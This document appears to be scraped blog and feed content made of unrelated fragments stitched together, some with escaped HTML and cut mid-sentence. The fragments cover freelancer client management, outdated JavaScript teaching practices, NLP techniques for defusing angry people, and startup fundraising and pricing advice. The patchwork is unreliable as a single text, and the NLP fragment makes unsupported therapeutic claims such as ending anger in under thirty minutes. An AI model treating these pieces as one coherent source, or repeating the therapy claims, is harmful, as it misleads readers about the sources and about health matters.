gets onto <a href=\"http://news.ycombinator.com/\">Hacker News</a> and gets dozens of upvotes. This is your chance to write one great answer which is going to prove to a hiring manager somewhere that you deserve an interview.</p>\n<p>The theme of Stack Overflow is <em>being awesome.</em> Learning, teaching, and, at <a href=\"http://careers.stackoverflow.com/\">Careers 2.0</a>, demonstrating your awesomeness. It’s not about hiring managers who want to hire the people with the most points… it’s about letting hiring managers see who you really are instead of just being a list of previous employers and schools.</p>"

In this hilarious and all-too-true scenario, the client continues to make more and more horrific changes to the design. Under each subsequent “suggestion,” Inman has inserted footnotes to the effect of “I actually had a client make this request …”</p><p>Prospects are from heaven. It’s the promise of a new project, a new relationship, and some new money in your bank account. It’s the hope and expectation of how we can make all our client’s web marketing dreams come true. Prospects and leads are the lifeblood of the freelancer. As someone once told me: I eat what I kill.</p><p>If prospects are the honeymoon, then clients are the marriage. And wherever fallible human beings are involved, assumptions and misunderstandings are sure to follow. So how do you prevent the relationship, much less the design, from going “straight to hell”? Here are two potential stumbling blocks you’ll encounter with even the best of clients, and how to be prepared for them when you do.</p><h2>The Content <em>Will</em> Arrive Late … if at All</h2><p>This quote from Kelly Goto of <a href=\"http://www.gotomedia.com\">Goto Media</a> says it all:</p><blockquote><p>The myth is that the content will arrive on time. The mystery is that no matter how organized both you and the client are, the content will inevitably arrive late.</p></blockquote><p>The content <em>will</em> arrive late, so how do you deal with it? As I explained in my first-ever SitePoint article, <a href=\"http://www.sitepoint.com/bulletproof-web-design-contract/\">Bulletproof Web Design Contracts</a>, if you’ve made the mistake of attaching payments to production milestones, then you’ve got a problem.</p><p>Project milestones are things like: start of the project; the design phase; HTML markup phase; copy writing phase; back-end coding phase; and of course, project completion.</p><p>So here’s the scenario: The client has agreed to pay 25 percent up-front and the remainder upon completion. He immediately sends you photos, so you mockup and code the site, create all the pages and links, but … he delays for seven months before sending any copy.</p><p>Not that I’ve ever done this … but suppose you were <em>even more foolish</em>, and agreed that the client didn’t have to pay a dime until the site was finished? So seven months later, the site is 95 percent complete, and I’m still waiting … that is, <em>you’re</em> still waiting for this guy to give me …err, you … a few text files so you can complete the site and get paid.</p><p>Okay, I was that young and dumb once, but I eventually hit on a better way:</p><p><strong><em>Never attach payments to production milestones.</em></strong> Oh, did I already say that? Instead, require payment within a certain number of days. Here’s what I did.</p><p>After a several sites under my belt, I figured out that, even with client delays, I completed most projects within 60 to 90 days. So, using 90 days as the benchmark, I set up payments like so:</p><p style=\"padding-left:30px\">25 percent up front<br> 25 percent 45 days later<br> Remainer at 90 days—regardless of whether the site was finished or not.</p><p>Now, if it was <em>my fault</em> the site wasn’t finished, I had the option (and the obligation, I might add) to complete it before demanding final payment. Yet, if <em>the client</em> was the reason for the delay, I still got paid.</p><h2>The Client <em>Will</em> Want to Make Changes to Your Masterpiece</h2><p>Coming from a graphic/print design background, one of the things I struggled with early in my web career were client changes to my design. It took a few projects for it to dawn on me that the site I was designing was a business tool—not a work of art.</p><p>It’s a given that clients will want to make changes to your initial design. And just like with your payment schedule, your contract should state exactly how many he’ll get. Regardless of how many or little you’ll allow, sometimes dealing with any type of client change can be the most difficult thing of all, especially if the “change” comes in the form of criticism.</p><p>Clients will have opinions. Some will make sense. Many will not. One client told me that they didn’t like all the “empty spaces” on the site I was designing. Once I figured out what they meant and explained the concept of <a href=\"http://www.alistapart.com/articles/whitespace\">white space</a>, they deferred to my expertise. It’s your responsibility as designer/developer to advise the client. Most will allow you to be the expert. Some will not.</p><p>Maybe you’re fine with what the client had to say about your design, but you don’t like <em>how</em> he said it. Perhaps he was less than kind. Maybe he was even a little mean.</p><p>Assuming you don’t have the luxury of firing clients, how will you deal with this?</p><p>Don’t misunderstand. I’m not talking about abusive clients who demand the world, yet take their time paying you for it. These clients deserved to be fired. I’m referring to <a href=\"http://magazine.creativecow.net/article/clients-or-grinders-understanding-the-three-market-types\">the 70 percent</a> sandwiched between your upper-end “cream of the crop” clients and the low-end cheapskates. It’s the overworked, small business owner who has so much on his plate that he forgot to be as “nice” as you think he should have. When this happens, do you take all your marbles and go home?</p><p>Here’s some simple, yet difficult advice. Don’t take offense. Remember, it’s not personal; it’s just business. Your client is making decisions he thinks are best for his business—however illogical they may actually be. Once you’re offended, everything you say to the client about why you disagree with him will drip with defensiveness. The interesting thing about that phrase is the word “take.” This tells me that I have a choice. I can take it, or I can refuse to pick it up. Not taking offense goes a long way towards turning the client around to your point of view. After all, isn’t that what you want?</p><p>So there you have it, the two biggest client challenges you’ll face in your web development career—at least in my opinion. What do you think? Are those your top picks?

      "content" : "<p>I am currently tech-reviewing a book that is used in educational environments (schools, universities, corporate training) on <span>HTML5</span>, CSS and JavaScript, or – in short – web development. And needless to say I am pretty shocked by what is taught in schools on that subject.</p>\n\n\t<p>It annoys me that the first materials new learners get seems to repeat a lot of mistakes of the past. Following I will show some of the issues and what we should be doing instead.</p>\n\n\t<p><strong>Disclaimer:</strong> these are examples I did come across in current code examples and training materials. Anyone shouting that “nobody uses that anymore” and “what kind of idiot would code like that” should please take the stairs down from their ivory tower and get their hands dirty in real, day-to-day training that happens in our schools and corporate training rooms. I am not making this up – this is the impression people get when starting on the web from a school or corporate angle rather than reading magazines, blogs or follow some known people on Twitter.</p>\n\n\t<p><h2>The “hello world” from hell</h2></p>\n\n\t<p>The thing I keep seeing as the first code example is something like this:</p>\n\n<pre>&lt;script type=&quot;text/javascript&quot; language=&quot;javascript&quot;&gt;\n&lt;!--\ndocument.writeln(&quot;hello world of JavaScript&quot;);\n// --&gt;\n&lt;/script&gt;</pre>\n\n\t<p>This is normally followed by explanations that:</p>\n\n\t<p><ul><li>this is the way to embed a script,</li><li>that the type and/or the language is important to tell the browser what kind of script it is and</li> <li>that the comments are needed to stop browsers from displaying the code. The JavaScript line comment “//” in the last line is sometimes added “to make sure that your <span>HTML</span> validates”</li></ul></p>\n\n\t<p><strong>If you really use an <span>HTML5 </span>Doctype none of them are needed</strong>. JavaScript is the only language browsers that support <span>HTML5</span> and are in use will execute so the type attribute only makes sense when you want to embed a script that shouldn’t be rendered by all. Some client side templating languages do this. JScript is dead, let’s not even bother telling people about it.</p>\n\n\t<p>As for the comments, I haven’t come across any browsers ever that display the code inside script blocks. If you really worried about backwards compatibility that goes back to <del>Lynx</del><ins>Netscape 1</ins>(as apparently Lynx is still in production) then you should also not embed your scripts in the page.</p>\n\n\t<p>In the end, this is what we will do in any case to reap the benefits of maintaining our scripts in separate files. Embedded code in a page is only needed for high performance environments that need everything in one cached file. The other time I keep seeing embedded JS code is to apply a quick fix to a product or to add a “one off as this is a special page” and thus making maintenance harder.</p>\n\n\t<p><strong>Let’s do this instead</strong>: the way to write a “hello world” would be to write an <code>index.html</code> that explains the very needed basics of semantic <span>HTML</span> and embed the following:</p>\n\n<pre>&lt;script src=&quot;helloworld.js&quot;&gt;&lt;/script&gt;</pre>\n\n\t<p>That way people never get tempted to mix behaviour, structure and presentation and get to understand what it means to build a web product rather than a page that has everything in one file.</p>\n\n\t<p>Of course, there can be benefits of keeping all in one document. For starters you can explain how the different things work together. In a real development environment, however, this is the odd one out and our primers should not start explaining those. It is much harder to un-learn things than it is to learn them, so why do we start with something you won’t use later on?</p>\n\n\t<p>Let’s treat both <span>CSS</span> and JS like we treat images in an <span>HTML</span> document – an external resource. This is the biggest use case and it is the one we should get people to start with.</p>\n\n\t<p><h2>The curse of <code>document.write()</code></h2></p>\n\n\t<p>Every time I see a <code>document.write()</code> or <code>document.writeln()</code> in materials these days I die a bit inside. I was around when we had to use that to write framesets into popup windows we just opened. The reason was that browsers didn’t support the <span>DOM</span> to reach content in the page or to create <span>HTML</span> content. I don’t want to remember those times, and neither should people who come into the world of web development for the first time.</p>\n\n\t<p>I understand that it is the easiest way to show output in a document – to give new developers their first “wow, what I just programmed shows up on a screen” moment. I also know, however, that I would never hire anyone who uses <code>document.write</code> just to print out something on the screen.</p>\n\n\t<p>Using <code>document.write()</code> teaches developers that JS writes out content where you add a script node – not how to interact with <span>HTML</span>.</p>\n\n\t<p><strong>Let’s do this instead:</strong> instead of writing to the document we have a few options. These are ordered in preference, starting with the least desirable:</p>\n\n\t<p><ul><li><strong>Use <code>alert()</code></strong> – which is only marginally better, but comes with a few benefits. Alerts are disruptive. They stop the execution of your code and you can for example show how the value of a variable changes through the execution of your script. The issue with them is that if you want to show a lot of values, it can become annoying to hit enter to get rid of all the alerts. In new Firefoxes for example alerts are stacked instead of stopping the execution, which means that this benefit is gone.</li><li><strong>Start with a simple introduction to the <span>DOM</span></strong>. It is really simple if you think about it:</li></ul></p>\n\n\t<p><blockquote>Using the Document Object Model (DOM) we can reach elements in the page. Say for example you have a <code>&lt;p id=&quot;result&quot;&gt;&lt;/p&gt;</code> in the document. Using <code>document.getElementById('result')</code> in your JavaScript will give you access to this element. You can read and write to this element by using <code>innerHTML</code>. So if you do a <code>document.getElementById('result').innerHTML = 'My result'</code> you will see that the content of the paragraph is changed to “my result”. If you do an <code>alert(document.getElementById('result').innerHTML)</code> you will get an alert stating ‘my result’ as this is the text content of the paragraph after you changed it.</blockquote></p>\n\n\t<p>That’s not too hard, is it?<li><strong>Introduce debugging tools from the very start</strong> – explain consoles in browsers. All modern browsers come with a development console that can show messages written out with <code>console.log()</code>. By starting with that we explain developers how to debug code before they write it and we let them see what is going on in their code. It is like showing a new trainee where the manuals and the first aid kit are before allowing them to use the power tools. Most of our job is testing our code – not writing it. In the real world we spend most of our time debugging and refactoring code – so why not start with this?</li></p>\n\n\t<p><h2>The curse of <code>alert()</code> and <code>prompt()</code></h2></p>\n\n\t<p>Using alerts and prompts to print out results and get content from users is a simple way that works in any browser. However, in a real product you will hardly ever use an alert (other than for debugging) and I can safely say that I never saw the use of prompt outside of tutorials.</p>\n\n\t<p>Hands up who ever made the mistake of adding an <code>alert()</code> in a massive loop or try to debug a <code>blur()</code> event handler using an alert and thus ending up in an endless debugging loop. Yes, it happens and it doesn’t make sense to go that way when browsers (and server-side JavaScript) have debugging tools these days that are much better in showing us what happens under the hood. A console shows us the objects and <span>DOM</span> elements rather than a cryptic <code>[object object]</code> as debugging information.</p>\n\n\t<p><strong>Let’s do this instead:</strong> instead of using the browser object model and alerts, confirms and prompts use the console for debugging and form fields for data entry. It is really not that hard to write a simple explanation how to access data in a form:</p>\n\n\t<p><blockquote>Forms in documents allow you to get information from the user and act on it. Say you have the following form in a page:</blockquote></p>\n\n<pre>&lt;form action=&quot;post.php&quot;&gt;\n&lt;label for=&quot;entrynumber&quot;&gt;Please enter a number&lt;/label&gt;\n&lt;input type=&quot;number&quot; name=&quot;n&quot; id=&quot;entrynumber&quot; placeholder=&quot;0&quot; required&gt;\n&lt;input type=&quot;submit&quot; value=&quot;calculate!&quot;&gt;\n&lt;/form&gt;</pre>\n\n\t<p>The <code>label</code> element is needed to tell users what the entry field is and what they should do with it. The <code>type</code> attribute tells the browser what kind of entry field we expect – in this case a number. The name is needed for a backend script to get the information when the form is sent to the server and the <code>id</code> is needed to connect the label and the input element, the <code>placeholder</code> shows the user an expected value and the <code>required</code> attribute validates the form in the browser.</p>\n\n\t<p>As with all elements in the document you can reach the input field using the <code>document.getElementById()</code> method in JavaScript. <del>and you can set and read the <code>value</code> of the field with <code>getAttribute()</code> and <code>setAttribute()</code>. So if you want to use JavaScript to set the value of the <code>entrynumber</code> to 5, all you need to do is <code>document.getElementById('entrynumber').setAttribute('value',5)</code>. If you want to read the value of the field you can do a <code>console.log(document.getElementById('entrynumber').getAttribute('value'))</code></del></p>\n\n\t<p><ins>You can set and read the value of the field by reading or writing to the <code>value</code> property of the element. To set the value of the <code>entrynumber</code> to 5, all you need to do is <code>document.getElementById('entrynumber').value = 5</code>. If you want to read the value of the field you can do a <code>console.log(document.getElementById('entrynumber').value)</code></ins><br>\n</p>\n\n\t<p>(after some testing and feedback from Mathias Bynens this still is the better way to teach new developers)</p>\n\n\t<p>Back that up with a working example you link to and you already explained how forms work, what some of the attributes do, that browsers these days have client-side validation and how to read and write form values. And it wasn’t that long and hard to do.</p>\n\n\t<p><h2>The myth of the short attention span</h2></p>\n\n\t<p>Whenever I ask people to explain the why and not just the how in tutorials I get feedback that our readers are busy and want to see the outcome as soon as possible. The general consensus is that readers have an incredibly short attention span and don’t want repetition or get long winded explanations.</p>\n\n\t<p>That may be true, but it doesn’t mean that you need to spoon-feed information. It means that the start of your tutorial must grab their attention and you must make it interesting. If going through a tutorial and coding along is fun then people will not realise how long they spend on a certain task.</p>\n\n\t<p>Look at gaming: Angry Birds didn’t come with a tutorial – every time you get a new type of bird there is a simple picture showing you what they do and how to activate their special skills with your finger. They could have written a long document but they didn’t need to. If you really think people have a short attention span and lose interest really fast just see how many times people try to solve the same level over and over again as it is fun to see pigs explode. The same applies to “Cut the rope”. You feel bad when the little frog frowns as the candy gets lost and its constant excitement about the impending feeding makes you want to solve the puzzle all the more. Why do we have this attention only when it comes to “wasting our time” playing games?</p>\n\n\t<p>Our training materials should learn from that and keep our readers excited and wanting to learn more. You don’t do that with dry examples of die throwing simulators and mathematical loops calculating prime numbers. Bring emotion into your materials or show real life examples and you will have the attention of your readers. In a training, have the group discover the materials bit by bit rather than giving them a massive binder with information and examples that need to be done by then end of the day if you want to get a shiny certificate to collect dust on your wall.</p>\n\n\t<p><h2>Lipstick and a wig on a pig</h2></p>\n\n\t<p>You can not re-use old materials by spicing them up with new technology. Period. Whenever a new buzzword appears, some old books get dusted off and new features get added. This happened with <span>DHTML</span>, then Ajax, then Mobile Web Development and now <span>HTML5</span>. Replace the Netscape 3 screenshots with Chrome ones, slap on a chapter covering the new techniques and voilá – you got yourself a new seller. I am sure a lot of people get approached by publishers to “write a new version of this old book, you, know, upgrading it”. Just say no!</p>\n\n\t<p>Unless the original version of the book has been incredibly well written – and I have yet to find one of that calibre – this is a waste of everybody’s time and borders on a scam. In the past, a big part of web development was either working around bugs in browsers or catering for a special environment. Both are things of the past and you can’t just add a theoretical new chapter to upgrade an old book that is based on dated approaches.</p>\n\n\t<p>We still struggle to find a correct way to build things on the web and our development practices change constantly. Performance issues, security concerns and stability are constantly fixed and changed in browsers and what was a great idea in the past can easily now get your site hacked or make it perform incredibly bad.</p>\n\n\t<p><h2>Changing the approach of explaining code in web development</h2></p>\n\n\t<p>All of this inspired me to write another beginners tutorial to web development. Instead of showing all the things that are possible we should show what makes sense and gets people on their way. A solid foundation with the least necessary information is a great starting point to go out there and learn on your own terms. Our tutorials and courses should start a desire to learn more – not to ensure we got all the information out that we were asked to shove down the throats of our students.</p>"

While human instinct is normally to get ready to fight or run for the hills there are other options available to us too. Recently I was emailed by a reader of this blog who had to write an assignment on dealing with unreasonably angry customers or co-workers and it has inspired this post today. These are the four techniques for using Neuro-Linguistic Programming (NLP) to deal with angry customers:</p>\n<p><strong>Get Angrier Than Them</strong><br>\nThis technique is a great quick way to diffuse a difficult situation. How it works is you allow yourself to feel much, much, much more angry than the other person about the situation which they are angry about. You will reach a point where they will become uncomfortable with how angry you are about the situation and they will start to try and convince you that actually everything is okay.</p>\n<p>I experienced this many years ago, well before I knew about NLP, when I was working in a Retail Electronics Store. I had sold a big wall clock to a lovely man who had taken it home only to find that I hadn’t sold him the batteries he needed to go with it. He then drove back to the store, hunted me down and decided to angrily share with me how I had ruined his Saturday by wasting his precious time, the extra cost of fuel, the inconvenience etc. etc. etc! At first it took me off guard but then I started to get really angry too. But I directed the anger at myself and started saying things like, “I can’t believe I could be so hopeless, what was I thinking being so careless? What a huge problem I had caused for you and there is nothing I can do to repay you and I feel just TERRIBLE.” Suddenly, something peculiar happened. The man totally flipped his emotional state and started saying to me, “It’s okay, you didn’t do it on purpose. You probably sell loads of products, how were you to know this one didn’t have batteries” and so on, and so on. I calmed myself down, we found him the batteries and the situation was nicely resolved leaving a happy customer and without needing to involve my Manager.</p>\n<p><strong>Pacing and Leading</strong><br>\nThis technique has many versions but in this context I refer to pacing and leading the emotional state of the other person. To use this successfully you will need to be able to regulate how you feel from moment to moment. You start by pacing the angry customer by getting angry and worked up yourself. Once you have started to pace their emotional state you can allow yourself to calm down again they will often calm down with you.</p>\n<p>Several years ago I used to own a beautiful fast black ute. It went like a dream. On one occasion I took a corner at some traffic lights a little bit fast and, as the tray of the ute was empty, the back of the ute fish tailed slightly out of control. I kept control of the vehicle just fine and continued driving home only to be pulled over a few minutes later by the angriest traffic cop I have ever met. He pulled me over, approached my drivers side window and before I wound the window down I could already see the veins popping out of his neck from how angry he was feeling. “Oh no,” I remember thinking to myself. I thought, this is going to take a bit of quick thinking on my part so I decided to do my best to Pace and Lead this cop. The window wasn’t even half way down when he started shouting at me, “Did I know what I was doing? Did I have any idea how dangerous my driving had been?” so, as with the previous example, I started getting angry with myself. “What on earth was I thinking? I can’t believe myself! I know what the ute is like without a load, what on earth was I doing taking the corner so quickly?” and before I knew it both the cop and I were in a similar emotional state. And then I paused and took a deep breath in and started to slow down the speed I was talking. I started to make myself feel more calm and relaxed. As I did I noticed the traffic cop’s neck started to show signs of relaxation too. Before I knew it we were talking much more casually and he allowed me to continue on my way – not even a Warning thanks to the power of Pacing and Leading.</p>\n<p><strong>Pattern Interrupt</strong><br>\nA Pattern Interrupt is when you do or say something that distracts the other person from what they are thinking about or feeling. This is often done by bringing their conscious attention to something that they had previously been ignoring.</p>\n<p>This is a nice simple technique and it will momentarily distract them from their anger. Simple examples include:</p>\n<blockquote><ol>\n<li>Did you realise your shoe laces are undone?</li>\n<li>Wait…. (*point to the sky*) is that a UFO?</li>\n<li>*start jumping up and down on the spot*</li>\n<li>*dramatically pretend you’re about to sneeze*</li>\n</ol>\n</blockquote>\n<p>You’ve successfully used this technique when you’ve distracted them from what they were thinking about in that moment.</p>\n<p>I remember being in a Night Club and being approach by an angry (and apparently drunk) bloke who was spoiling for a fight. He came up to me with one of those standard lines, something like, “What do you think you’re looking at?” So I raised my right hand and moved it towards him in the way you would to shake hands. Without thinking he reciprocated and I started introducing myself. He lost his train of thought for a moment, stared at our hands joined together, then back at my face, then back at my hands and then he dropped my hand, turned and went back to his friends. The Pattern Interrupt had broken his state and dissolved the anger from the situation.</p>\n<p><strong>Confusion</strong><br>\nThis is my favourite and I originally read this in one of Derren Brown’s books. It is similar to a Pattern Interrupt and essentially it involves saying something that makes logical sense but it is totally irrelevant in the current context. The idea behind this is that when the angry person hears it and tries to make sense of it they will be left feeling confused and that confusion can replace their momentary anger.</p>\n<p>An example of something that you could say to create confusion in a retail environment would be saying in a calm normal tone of voice:</p>\n<blockquote><p>But isn’t it interesting how the people who aren’t not watching what isn’t not going on over there haven’t yet said anything to the people they’re not thinking about calling on their mobile when they get home?</p></blockquote>\n<p>This is not one I have had the chance to use and I have my fingers crossed I don’t bump into too many angry people in the future!</p>\n<p><strong>In the long run…</strong><br>\nWhile each of these techniques are great to dealing with someone else that is angry in the moment it won’t be much use in the long term. Anger is a strong emotion and it is important that people express it both safely and appropriately for themselves and others. It is possible using Time Line Therapy<sup>TM</sup> Techniques to totally let go of Anger in less than 30 minutes. If you are currently experiencing Anger about something, or you know someone that could do with some Anger Management assistance then point them in the direction of a NLP Coach or Time Line Therapist ASAP.</p>\n\n\n<p><strong>Related posts:</strong><ol><li><a href=\"http://www.confidentfuture.com.au/blog/look-at-your-man-now-back-to-me/\" rel=\"bookmark\" title=\"Permanent Link: Look at Your Man, Now Back to Me\">Look at Your Man, Now Back to Me</a> <small>Old Spice have produced some ingenious adverts recently that have...</small></li>\n<li><a href=\"http://www.confidentfuture.com.au/blog/is-there-someone-you-cant-stop-thinking-about-yet/\" rel=\"bookmark\" title=\"Permanent Link: Is there someone you can&#39;t stop thinking about yet?\">Is there someone you can&#39;t stop thinking about yet?</a> <small>Have you ever met someone that just took your breath...</small></li>\n<li><a href=\"http://www.confidentfuture.com.au/blog/meta-model-part-1/\" rel=\"bookmark\" title=\"Permanent Link: Meta Model Part 1\">Meta Model Part 1</a> <small>The Meta Model is a very important tool for recovering...</small></li>\n</ol></p><img src=\"http://feeds.feedburner.com/~r/LloydyNLP/~4/hkgwRgn6-HQ\" height=\"1\" width=\"1\">"

Where the journey is the reward. Then, you’re likely to have unique insights (in the details) and consistent execution, through thick and thin, to find fit.</p>\n<p>Often, the best companies are ones where the product is an extension of the founder’s personality, which shouldn’t be a big surprise, since everyone is passionate about themselves.</p>\n<div>\n<a href=\"http://feeds.venturehacks.com/~ff/venturehacks?a=a8lXQv2LliM:cyAvE35qe7Q:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/venturehacks?i=a8lXQv2LliM:cyAvE35qe7Q:D7DqB2pKExk\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/venturehacks/~4/a8lXQv2LliM\" height=\"1\" width=\"1\">"

I have this blog, a nice  Twitter following, attention in my local community, and social “favors” I  can call in, and it’s still almost impossible. And the thing about good  people is they always have options: Existing job, other excellent  offers, the freedom to not work for a while, etc..</p>\n<p>If someone handed me a million dollars it wouldn’t help me find an awesome person; they’re just scarce.</p>\n<p>Once I find someone, however, then money helps a lot, because I could  satisfy any salary requirement, handle relocation, provide a signing  bonus, lease a car, or whatever else is necessary to make money “not the  issue.”</p>\n<p>So if you’re raising money and you don’t have your team assembled,  the investor knows that handing you $200,000 won’t change that. But if  you have the team, but they’ve had to work in their spare time because  everyone needs a day job to pay mortgages, that’s a good reason to raise  money.</p>\n<h3><strong>Marketing</strong></h3>\n<p>Marketing of most sorts can be solved with money. Money means you can  spray ads everywhere. Money means you can try 20 different campaigns  even if most utterly fail. Money means you can try 50  titles/descriptions/landing pages through AdWords until you find one  that converts decently.</p>\n<p>One big exception is anything that requires <a href=\"http://blog.asmartbear.com/authentic-dead.html\">authority</a>, like blogging and other social media stuff. You can’t buy authority. You can’t buy that <em>kind</em> of attention, where people listen because they want to listen, not  because they’re interrupted, where they interact with you because they  respect your opinion.</p>\n<p>Social media marketeers (like mouse-katteers but with larger Twitter  followings) have already beat this point to death; no reason to repeat  it. But if your business requires the modern “tell-your-friends”  social-media-style punditry to succeed, you’ll have to do that without  money. If it’s just a matter of pouring more marketing dollars in the  top so you can crank out more revenue in the bottom, that’s a machine  investors like to power.</p>\n<h3><strong>And so forth</strong></h3>\n<p>You see where this is going, so <strong>let’s accelerate</strong>:</p>\n<ul>\n<li>Writing more code, faster, yes. Knowing <em>what</em> to write, no.</li>\n<li>Acquiring more leads, yes. Know how to convert them, no.</li>\n<li>A prettier website, yes. What text to put on the website, no.</li>\n<li>Leeway to make mistakes, yes. Philosophy of learning and using mistakes to improve, no.</li>\n<li>A QA team to improve quality, yes. Knowing when a bug isn’t important enough to prevent shipping, no.</li>\n<li>Time to outlive a recession, yes.</li>\n</ul>\n<p>The pattern: Concepts, behaviors, knowledge, and process cannot be  fabricated with money, and possibly cannot even be accelerated. Once you  know what to do or, more likely, you know how to learn quickly, then  money becomes an accelerant.</p>\n<p style=\"text-align:center\"><a href=\"http://www.andertoons.com/cartoon/1009/\"><img title=\"1009\" src=\"http://asmartbear.wpengine.netdna-cdn.com/wp-content/uploads/1009.jpg\" alt=\"\" width=\"340\" height=\"273\"></a></p>\n<h3><strong>Now therefore…</strong></h3>\n<p>Supposing you’re about to raise money, in light of this discussion what should your pitch include?</p>\n<ul>\n<li>Emphasize how spending money will improve specific things which, today, are broken or missing <em>only</em> because money is lacking.</li>\n<li>Show proof of your ability to master the things money cannot buy – your ability to learn, change, and improve.</li>\n<li>For those things money can accelerate, and for which you’ve spent a  teeny amount of money, show how well you’ve done with that. It’s easy to  imagine more money bringing more results.</li>\n<li>For those things money can’t solve and which you haven’t mastered,  bring it up before the investors do and have a plan, which in itself  proves you’re cognizant and thorough. If you don’t have a clear,  plausible plan, don’t raise money yet.</li>\n<li>Specifically, don’t raise money if you haven’t assembled the core team.</li>\n</ul>\n<p>Let me make point #2 tangible.</p>\n<p>I cannot count the times I’ve heard someone proclaim how adaptable  they are. “I’m in love with A/B testing.”  ”I’m not afraid to admit when  I’m wrong.”  ”I listen to my customers.”  ”I’m a big fan of Eric Ries.”</p>\n<p>Yeah, <a href=\"http://blog.asmartbear.com/startup-marketing-ideas.html\">you and 60,000 other people</a>. I’m supposed to be impressed?</p>\n<p>Since everyone and their dog is now an expert in Lean Startup, you need to <em>demonstrate</em>, not regurgitate platitudes. Tell me about how and why your pitch changed when you <a href=\"http://blog.asmartbear.com/vetting-startup-ideas.html\">vetted your idea with potential customers</a>. Walk me through a <a href=\"http://blog.asmartbear.com/creativity-over-optimization.html\">screenshot</a> of your app, revealing the customer feedback that lead to each part.

Always be collecting <a title=\"My article on how I decided one of my ideas was NOT good\" href=\"http://blog.asmartbear.com/vetting-startup-ideas.html\">evidence that you’re wrong</a>, always be trying new things in case you’ve been blind. Never pass up an opportunity to change, learn, grow.</p>\n<p>So… how are you supposed to explore other ideas if you’re also  supposed to be saying “no” to anything that diverges from The Plan?</p>\n<p><strong>Here’s what I do: I never say “no.” But I carefully qualify “yes.”</strong></p>\n<p>I learned this trick while still in high school. In the mid 90s it  was clear that Apple had lost the personal computer battle and all their  developers were fleeing like rats off a sinking ship into the ocean of  opportunity that was Windows 95. As a maven of the Macintosh API and  still willing to admit it, I landed lots of small contracting jobs  fixing up code that other developers wouldn’t touch.</p>\n<p>My typical rate was $25 per hour, which when you’re 17 seems like a lot of money.</p>\n<p>One day I got a call from some poor schleps I didn’t want to help.  They had just completed a new product written in Java and it was broken  on a Mac, and could I help? None of their customers used Macs, so they  didn’t think Macs were important, but then it turns out the main  investor is keen on seeing the demo on a Mac, and when they tried it, it  didn’t work. (Yay investors!)</p>\n<p>I wanted no part of this. Java was new and known to be full of bugs,  and anyway I was a C/C++ kind of guy, and I didn’t want to get involved  in an academic fad language like Java. (So yeah, I simultaneously  decided that (1) Java is a fad and (2) I’m sticking with the Macintosh  Toolkit; five years later one those platforms had zero developers and  the other had one million, and I picked exactly wrong.)</p>\n<p>I could have said “no.” Given my specialty and my goals, traditional career (or startup) theory says I should have said “no.”</p>\n<p>But instead, on the advice of an older, wiser friend, I showed up at their office and said I’d do it for $100 per hour.</p>\n<p>I fully expected them to laugh in my face. Maybe I would receive a condescending talking-to about the audacity — nay, the <em>impudence! — </em>of  someone of my age and experience walking in here and demanding such  outrageous compensation, someone who, let’s be clear, is technically too  young to even enter into a legal consulting agreement in the first  place.</p>\n<p>And then I would have slinked out of there, embarrassed but ultimately no worse for wear.</p>\n<p>But that’s not what happened. They looked me up and down, their faces  revealing both incredulity and surrender. They said OK. An hour and a  half later, everything was working. The difference between saying “no”  and getting $150 for about two hours of my life was all in how I phrased  “yes.”</p>\n<p><strong>And I have stories that went the other way, which are just as important.</strong></p>\n<p>At <a title=\"My newest company\" href=\"http://wpengine.com/?a_aid=asmartbear\">WPEngine</a>,  for example, we’re constantly talking to large bloggers who want to  move to our system. These are folks with big requirements — tens of  millions of monthly page-views, traffic spikes, custom code, perfect  up-time, and 24/7 support.</p>\n<p>Should we take on those clients? Maybe not — after all the stated  goal of WPEngine is to serve the “middle market” — the folks who have  outgrown free blogs, don’t like maintaining their own servers, but  aren’t so large that they have extreme hosting demands. That’s our  profitable niche.</p>\n<p>So we think. But if we just say “no” to these big bloggers, maybe  we’re closing the door on big, important orders. Perhaps the entire  company should pivot — maybe it’s easier or more profitable to serve 100  large blogs than 1000 medium ones. But how do we know if we say “no?”</p>\n<p>Then again, if we say “yes” we might really be screwed. If we can’t  provide them the human and technical service they expect, now we’ve hurt  a blogger, we get bad press, and we’ve wasted a bunch of time. Or even  worse, we hold on for dear life but it’s extremely unprofitable, and now  we have this expensive, time-consuming albatross around our necks.</p>\n<p>So we’ve said “yes” by quoting high enough that we know for certain  we will make good money on the deal, so much so that it will partially  fund something else we want to do. Maybe that means a big new  advertising campaign, or hiring another WordPress expert for our staff.</p>\n<p>There was one especially large customer where we literally thought of  it like this: This deal needs to be big enough to not only make a  reasonable profit on the operating expenses, but pay for an entire  developer’s salary (assuming bootstrapped, put-in-elbow-grease-for-stock  low salary), because we know this new customer will occupy a lot of  that person’s time, but all the remaining time we get “for free.”</p>\n<p>So we’ve given a lot of qualified yeses, and many were rejected.  (I  wish I could name all the blogs who turned us down, but I feel it’s a  violation of trust, especially for those who have significant  relationships with their current providers.)</p>\n<p>(P.S. Now we’re able to say “yes” to those same bloggers, but that’s  because over time we’ve taken on bigger and bigger customers, and now a  blogger with 30 million month page-views is something we know we can  handle.)</p>\n<p>At <a title=\"My third company, home page\" href=\"http://smartbear.com/\">Smart Bear</a> I used this principle yet again. Companies would fly me out to help  them implement a peer code review process, which half the time actually  meant that “management” wanted me to convince everyone else that code  review was a good idea, and invent a process painless enough they might  actually do it.</p>\n<p>From a business perspective, this was a poor use of my time. These  folks had already bought our software, so it didn’t sell more seats.  When you counted a travel day on either side of the engagement, the time  I lost could easily have been spent landing just one additional  customer or make some important changes to the code, either of which  almost certainly makes us more money.</p>\n<p>Therefore, initially I just said “no.” But of course that’s wrong. Eventually I said “yes,” but the price was $2500/day <em>including travel days</em>,  which for these sorts of engagements is unheard of. (Typically you get  reimbursed for travel expenses but not paid for that time.)</p>\n<p>This immediately cut out most trips, but some remained.  Of course on  those trips I’d haul in $10,000 for a week of easy work, which I’d  often combine with a long weekend with my wife. And anyway those people <em>really wanted me there</em>, which made the work that much more enjoyable.</p>\n<p><strong>So the principle is easy:</strong> Set the conditions of “yes” such that:</p>\n<ol>\n<li><strong>If they say “yes,” you’re happy</strong> because the terms or money are <em>so good</em>, it more than compensates for the distraction, possibly even funding the thing you really want to do.</li>\n<li><strong>If they say “no,” you’re happy</strong> because it wasn’t a great fit anyway, so it’s not worthwhile for a small return on your time and effort.</li>\n</ol>\n<p>So that’s the punch-line, but before you go I’d like to <strong>over-emphasize the idea of “funding the thing you really want to do.”</strong></p>\n<p>This can take many forms, but 